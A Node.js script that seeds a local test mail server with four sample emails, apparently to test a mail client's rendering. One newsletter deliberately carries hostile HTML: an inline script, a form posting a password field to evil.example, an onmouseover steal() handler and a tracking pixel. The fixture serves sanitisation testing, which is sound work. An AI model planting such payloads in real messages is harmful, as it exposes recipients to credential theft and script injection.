const nodemailer = require('nodemailer');
const t = nodemailer.createTransport({ host: '127.0.0.1', port: 3025, secure: false, ignoreTLS: true });
const png = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAKklEQVR42mNgoBAwUqifgYmBgYHh////DFQxABkwNTZQzQAGWg0YaAUAAJ8bBRHz4UKYAAAAAElFTkSuQmCC', 'base64');
(async () => {
  const send = (m) => t.sendMail(Object.assign({ to: 'Kampf <kampf@test.local>' }, m));
  await send({ from: 'Grandma <grandma@family.example>', subject: 'Sunday dinner?', text: 'Hi sweetie,\n\nAre you coming for dinner on Sunday? I am making Kugel!\n\nLove, Grandma', date: new Date(Date.now() - 86400e3 * 3) });
  await send({ from: 'Mega Shop <deals@megashop.example>', subject: '50% off everything this weekend', date: new Date(Date.now() - 86400e3),
    html: '<div style="font-family:Arial;max-width:520px;margin:auto"><img src="https://tracker.megashop.example/open.gif?u=kampf" width="1" height="1"><h1 style="color:#d33">WEEKEND SALE</h1><img src="https://cdn.megashop.example/banner.jpg" alt="Sale banner" width="500"><p>Everything is <b>50% off</b>. <a href="https://megashop.example/sale">Shop now</a></p><script>alert("hacked")</script><form action="https://evil.example"><input name="pw"></form><p onmouseover="steal()">Unsubscribe any time.</p></div>' });
  await send({ from: 'Coach Lee <lee@school.example>', cc: 'friend@test.local', subject: 'Team photo + schedule', date: new Date(Date.now() - 3600e3),
    html: '<p>Hi team,</p><p>Here is our team logo <img src="cid:logo1" alt="logo"> and the schedule is attached.</p><p>— Coach</p>', text: 'Hi team, schedule attached. — Coach',
    attachments: [{ filename: 'logo.png', content: png, cid: 'logo1' }, { filename: 'schedule.csv', content: 'day,time\nMon,4pm\nWed,4pm\n' }] });
  await send({ from: 'Kugel Bot <bot@kompass.example>', subject: 'Welcome to Kugel Mail 👋', text: 'This is a test inbox on a local GreenMail server.\nLinks like https://github.com/KampfGuy/kompass open in your browser.' });
  console.log('seeded'); t.close();
})();
